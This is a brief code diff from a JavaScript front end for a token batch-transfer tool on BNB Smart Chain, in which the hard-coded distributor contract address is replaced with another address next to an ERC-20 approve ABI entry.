@@ -7,7 +7,7 @@ import QRCode from "qrcode";
 const STORAGE_KEY = "batchtransfer.config.v1";
 const CHAIN_ID = 56;
 const CHAIN_HEX = "0x38";
-const DISTRIBUTOR_ADDRESS = "0x501Ac36B6BbDB1e54D5A070C11DDE08D19f63274";
+const DISTRIBUTOR_ADDRESS = "0x666666C0264E4e56d3D7f28AEd0232705388C1FB";
 
 const erc20Abi = [
   "function approve(address spender, uint256 amount) external returns (bool)",
